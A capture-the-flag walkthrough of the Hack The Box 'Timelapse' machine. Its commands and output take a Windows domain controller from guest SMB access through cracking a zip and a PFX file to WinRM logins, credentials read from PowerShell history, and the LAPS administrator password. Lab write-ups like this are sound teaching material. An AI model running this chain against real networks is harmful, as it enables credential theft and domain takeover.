# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
```bash
nmap -sV -sC -vv 10.10.11.152
nmap -sU --top-ports=10 -vv 10.10.11.152

---OUTPUT-TCP---
PORT     STATE SERVICE           REASON          VERSION
53/tcp   open  domain            syn-ack ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-22 00:04:26Z)
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack ttl 127
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
5986/tcp open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-04-22T00:05:47+00:00; +7h59m59s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233:a199:4504:0859:013f:b9c5:e4f6:91c3
| SHA-1: 5861:acf7:76b8:703f:d01e:e25d:fc7c:9952:a447:7652
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQLRY/feXALoZCPZtUeyiC4DANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwHhcNMjExMDI1MTQwNTI5WhcN
| MjIxMDI1MTQyNTI5WjAdMRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJdoIQMYt47skzf17SI7M8jubO
| rD6sHg8yZw0YXKumOd5zofcSBPHfC1d/jtcHjGSsc5dQQ66qnlwdlOvifNW/KcaX
| LqNmzjhwL49UGUw0MAMPAyi1hcYP6LG0dkU84zNuoNMprMpzya3+aU1u7YpQ6Dui
| AzNKPa+6zJzPSMkg/TlUuSN4LjnSgIV6xKBc1qhVYDEyTUsHZUgkIYtN0+zvwpU5
| isiwyp9M4RYZbxe0xecW39hfTvec++94VYkH4uO+ITtpmZ5OVvWOCpqagznTSXTg
| FFuSYQTSjqYDwxPXHTK+/GAlq3uUWQYGdNeVMEZt+8EIEmyL4i4ToPkqjPF1AgMB
| AAGjRjBEMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAdBgNV
| HQ4EFgQUZ6PTTN1pEmDFD6YXfQ1tfTnXde0wDQYJKoZIhvcNAQELBQADggEBAL2Y
| /57FBUBLqUKZKp+P0vtbUAD0+J7bg4m/1tAHcN6Cf89KwRSkRLdq++RWaQk9CKIU
| 4g3M3stTWCnMf1CgXax+WeuTpzGmITLeVA6L8I2FaIgNdFVQGIG1nAn1UpYueR/H
| NTIVjMPA93XR1JLsW601WV6eUI/q7t6e52sAADECjsnG1p37NjNbmTwHabrUVjBK
| 6Luol+v2QtqP6nY4DRH+XSk6xDaxjfwd5qN7DvSpdoz09+2ffrFuQkxxs6Pp8bQE
| 5GJ+aSfE+xua2vpYyyGxO0Or1J2YA1CXMijise2tp+m9JBQ1wJ2suUS2wGv1Tvyh
| lrrndm32+d0YeP/wb8E=
|_-----END CERTIFICATE-----
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=4/21%Time=68066C9A%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32357/tcp): CLEAN (Timeout)
|   Check 2 (port 18003/tcp): CLEAN (Timeout)
|   Check 3 (port 22941/udp): CLEAN (Timeout)
|   Check 4 (port 62063/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-04-22T00:05:08
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127
```
- Kerberos, SMB, LDAP, SSL
- Domain : timelapse.htb
- SSL Common Name : dc01.timelapse.htb
## SMB Enumeration
- Tried null authentication with SMB:
```bash
smbclient -U '' -L //10.10.11.152 --password=''

---OUTPUT---
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- Also going to try with crackmapexec (NULL failed but guest passed):
```bash
crackmapexec smb 10.10.11.152 -u 'guest' -p '' --shares

---OUTPUT---
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\guest: 
SMB         10.10.11.152    445    DC01             [+] Enumerated shares
SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.152    445    DC01             C$                              Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.152    445    DC01             Shares          READ            
SMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share 
```
- We have read access on Shares which isn't a default share like the rest
- We access the share via smbclient:
```bash
smbclient -U 'guest' //10.10.11.152/Shares --password=''
smb: \> dir
smb: \> cd Dev\
smb: \Dev\> dir
smb: \Dev\> get winrm_backup.zip 
smb: \Dev\> cd ..
smb: \> cd HelpDesk\
smb: \HelpDesk\> dir
smb: \HelpDesk\> get LAPS.x64.msi 
smb: \HelpDesk\> get LAPS_Datasheet.docx 
smb: \HelpDesk\> get LAPS_OperationsGuide.docx 
smb: \HelpDesk\> get LAPS_TechnicalSpecification.docx 
smb: \HelpDesk\> exit
```
- I installed libreoffice to open the files but we can also check the md5 hash and check it in virustotal to see if its a known document:
```bash
md5sum LAPS.x64.msi 

---OUTPUT---
2f80ef0699d15d788caf897a9b3ceb05  LAPS.x64.msi
```
- We can then check in virustotal and it says it's a file distributed by Microsoft. So it probably won't have anything related to our box as its a generic file in our context.
- https://www.virustotal.com/gui/file/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
- ![[Pasted image 20250421123440.png]]
- Tried ldapsearch as anonymous but it requires authentication
- We try to crack the zip with john:
```bash
zip2john winrm_backup.zip
vi winrm.hash     # Copy hash output from last command here
john winrm.hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
```
- Unzipped the file and found a pfx file 
```bash
unzip winrm_backup.zip 

---OUTPUT---
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx
```
- I then tried certipy auth command to see if it would work (FAILED):
```bash
certipy auth -pfx legacyy_dev_auth.pfx -domain 'timelapse.htb'
certipy auth -pfx legacyy_dev_auth.pfx -domain 'dc01.timelapse.htb'

---OUTPUT-FAILED---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[-] Got error: Invalid password or PKCS12 data
[-] Use -debug to print a stacktrace
```
- I then read the file (with strings as cat won't give readable text):
```bash
strings legacyy_dev_auth.pfx

---RELEVANT-OUTPUT---
...
...
Legacyy0
r"*J0:
cZK3
".G,
x0v0
legacyy@timelapse.htb0
...
...
```
- Username may be legacyy rather than legacyy_dev
- Try to open the pfx file:
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx

> Enter password:
```
- I then try to crack the pfx file with john (takes some time to crack)
```bash
pfx2john legacyy_dev_auth.pfx
vi legacyy.hash # Copy hash from last command here
john legacyy_dev_auth.pfx --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
thuglegacy       (legacyy_dev_auth.pfx)
```
- We check if credentials work with crackmapexec
```bash
crackmapexec smb 10.10.11.152 -u 'legacyy_dev' -p 'thuglegacy'

---OUTPUT---
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\legacyy_dev:thuglegacy 
```
- We get a hit. We try with winrm too (FAILS):
```bash
crackmapexec winrm 10.10.11.152 -u 'legacyy_dev' -p 'thuglegacy'

---OUTPUT-FAILED---
SMB         10.10.11.152    5986   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
HTTP        10.10.11.152    5986   DC01             [*] https://10.10.11.152:5986/wsman
WINRM       10.10.11.152    5986   DC01             [-] timelapse.htb\legacyy_dev:thuglegacy "HTTPConnectionPool(host='10.10.11.152', port=5985): Max retries exceeded with url: /wsman (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f7438388c20>, 'Connection to 10.10.11.152 timed out. (connect timeout=30)'))"
```
- I try to open the pfx file again with the password:
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -info
Enter Import Password:


---OUTPUT---
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 

---PWD-PROMPT---
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:

---OUTPUT---
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQni88wTGzuhOCrZOZ
Qb7OjgICCAAwDAYIKoZIhvcNAgkFADAdBglghkgBZQMEASoEEKsVh4i9fAd3LjRb
m7TrZ6UEggTQHNzgo47jdiaHlFfVFYQclEVaqnY4r6NTOhO5wR0rpa4Zcha6QmRR
svS/h/jpM2kGpMdDPO0szR4U8aZqMTU7D/RWknHbvuRj7uJuQ+G6AjX21MQXTkmL
V2UV4O3rES7eTEq+HFP6oihYGGJAizIMTyYXvNOvMa7IvYtwFhNKfBGQmizB78hB
Xv+abF7uo3PFhCQw+SnLjJrFSRlo/hVLRiQClPZog0msNHJlxM8AS1+awYAfE8OE
J7IdG6exncAiq+9S9W1BAV1Fdj5o15iOZ+tUwvZ+koB+ykHP/R/9pvJeztvo2qa5
YKX/M8strMpR+Ah15tB+Yf8baw3qtFXFnnv674KOKgT0GkPzMpTc5OkXIKyUHRtY
nZkL9udpvF9LtBGqnjwjkvRRN4b+pCGGkZ3gy4Tzudghu0E4cfVMYNUnk05AaXOo
deGqrqLOjpu48/gLYrgubmW6VTf5swdBi2vJ3t5R9Hyhac6OinPzZn4mng8FUDG2
DD+1YAo/qXehtsOb9JPc055GNThe5xOGjcxZdNhUcK1MzMXda0JSnJFFX5V52+H8
2iBx7JPxQ/l1Ex012WX3Y3fpfNmeAoF0KLNt64xsHDCAygqrQnr6+SviE9GiENod
ec55lQ5Az7yTURm31GkcsixjYLgZrrwJyFhLzJ4lVU/7ryXqBgBbhFh1I4j4veDh
KSFbaNinPkTLhcs9lj2WKZDzbjy1rOnmlFcbdTH6XvdN6SjYH/vNz7OqnJMPjC60
A6LmdKwaDlc5fY1ydICoIC0QQMeMeaPfyB2XWMBNp8eZqtFPNlySsGiVz2301jOf
G5OWn8X4fon5Fpy3YE1adW/AVYeXSwd/cmftOxdCs/2UXLgFqy/QQ3fHL0ijh2BF
Xi0YxxSXPe+KbKy1/JkdeBW/mkGxPJJzWJB2l72Mvxv0Ux3IgqtPIdsYPA+cXrS+
C479IhpEHu6bu5ceq77loUMeVaH3Q8VhvEe9tKshAs39+eu4pW5fLR4P12Ukd7c8
rgrK6/RAlACdIoaOf1fEziIDAACH9EgWBbHQSee83ml4QAcvaywN1657Ed/ryAmU
WIc4DAFgCM3kEYrblddQavDfIdcC40wGEGKFHAe4hOKSjexDf4J4RxPJ8d9pKle3
h3sds9gPw4CTa5vaKnsaeFAw1fx6AvNecDl3E1Y5x+hC/o6fbK5XhwoORfu1c9oM
n0wsP4b5NU2IYkrYY0yAPBuLoMox5uQ7nigahViWOheb83YmE4D0z8TCJMIFhP+z
jGosef9yZ/7oBp11D+qkEpy3XP8sQJNyoTduqRu7KmGv7kE88N/SmML6sr5v061h
X+1h0Vds8eznTiKVNq33um8PYbTRXLu/mMEhIouVkSP6kT09Yz9odiIFRUfSXrun
erCKOg/weIyXV77p3H4d57lPvDCxEkXoivMZgiymhlBQaPAKBT2P5VMyVFtX59o6
L3r1n9uypQLamcmPmJm+3m+LnNK7T5e/G6dkQlIT9onNiTcJlSS5JHC5w49Mm5Bl
+7fSeMQxtPC7P+KoBnQBetd2zB+AqyZMZHPPfIp9V4rIn05rhAXGP6upicfZ/zjx
+zWurFDqq6KGZNx8ilu3ng5AlEO9Xdv58Oz0gfpWcc9vFvMZeaAnMnU=
-----END ENCRYPTED PRIVATE KEY-----
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN=Legacyy
issuer=CN=Legacyy
-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----

```
- We see a key and a certificate.
- We extract it. Note that we can copy it but sometimes whitespace might affect the key so it's better to extract with the openssl command itself:
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.cert -nodes
```
- We can check if winrm is open on target:
```bash
nmap -p5985-5986 10.10.11.152 -vv

---OUTPUT---
PORT     STATE    SERVICE REASON
5985/tcp filtered wsman   no-response
5986/tcp open     wsmans  syn-ack ttl 127
```
- If we check evilwinrm help option we can see we can input a key and certificate file as well as ssl authentication:
```bash
evil-winrm -c key.cert -k key.pem  -i 10.10.11.152 --ssl           
---OUTPUT---
Evil-WinRM shell v3.7
                         
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                       
Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```
- We grab user flag
## Lateral Movement
- **IMPORTANT enumeration for Windows**
- https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html
- To check powershell command history in the domain go to :
```bash
cd C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSreadLine
type ConsoleHost_history.txt

---OUTPUT---
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
- We get some credentials.
- We check with crackmapexec
```bash
crackmapexec winrm 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'

---OUTPUT---
SMB         10.10.11.152    5986   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
HTTP        10.10.11.152    5986   DC01             [*] https://10.10.11.152:5986/wsman
WINRM       10.10.11.152    5986   DC01             [-] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV "HTTPConnectionPool(host='10.10.11.152', port=5985): Max retries exceeded with url: /wsman (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f44b58a8c20>, 'Connection to 10.10.11.152 timed out. (connect timeout=30)'))"

```
- It fails after the connection to 5985 times out (we require 5986 SSL though from our nmap so we try to login with winrm anyway)
- we evil-winrm into the machine using SSL (doesn't work without):
```bash
evil-winrm -S -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152

---OUTPUT---
evil-winrm -S -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                       
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```
## BloodHound
- Now we have credentials we can grab files from target for analysis:
```bash
bloodhound-python --dns-tcp -ns 10.10.11.152 -d timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -c all
```
- We mark `svc_deploy` and `legacyy` as owned.
- In `svc_deploy` we go to Outbound Object Control > Group Delegated Object Control
- ![[Pasted image 20250421144755.png]]
- We see that it is a member of LAPS_Readers group which can read the LAPS password
- I  tried the exploit from the Windows route which required PowerSploit but AV exists so I couldn't execute the command.
- Maybe with metasploit.
- Used pyLAPS python file to grab the LAPS password:
```bash
python3 pyLAPS.py --action get -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV'

---OUTPUT---
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | DC01$                : 6112yW,$r%+.6b4&a+)&.uF#
[+] All done!
```
- Then logged in using winrm (note i just tested administrator but as svc_deploy we can pass `net users` to see the users):
```bash
evil-winrm -S -u 'administrator' -p '6112yW,$r%+.6b4&a+)&.uF#' -i 10.10.11.152

---OUTPUT---
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                       
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```
- The root file wasn't in the Administrator's Desktop but the user TRC's Desktop.
- **ALTERNATE METHOD**
- We can find out we can exploit LAPS by checking svc_deploy's groups
```bash
net user svc_deploy

---OUTPUT-RELEVANT---
Global Group memberships     *LAPS_Readers         *Domain Users
```
- We see `svc_deploy` is part of LAPS_Readers group.
- This is the group allowed to read LAPS Password.
- LAPS (Local Adminsitator Password Solution) randomizes local admin password for all machines (so we cant to Pass the Hash type things)
- however it stores it in active directory and only members of LAPS Reader can read the password
- On searching google I first found a Get-LAPSADPassword command which didn't work from this link 
- https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword?view=windowsserver2025-ps
- Then from this link I found a command that retrieved the pwd in plaintext.
- https://www.powershellgallery.com/packages/Get-ADComputers-LAPS-Password/2.0/Content/Get-ADComputers-LAPS-Password.ps1
- The documents we retrieved talked about what showed the password in plaintext so I search "AdmPwd" to find the entry:
```bash
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *

---OUTPUT-RELEVANT---
ms-Mcs-AdmPwd                        : 6112yW,$r%+.6b4&a+)&.uF#
```
- I also tried the exploit from the Windows route which required PowerSploit but AV exists so I couldn't execute the command.
- Maybe with metasploit.
-------
--------
## Extra
- Enumeration
- can pass this command in powershell to list all directories even hidden ones:
```bash
gci -force
#Shorthand for
Get-ChildItem -Force
```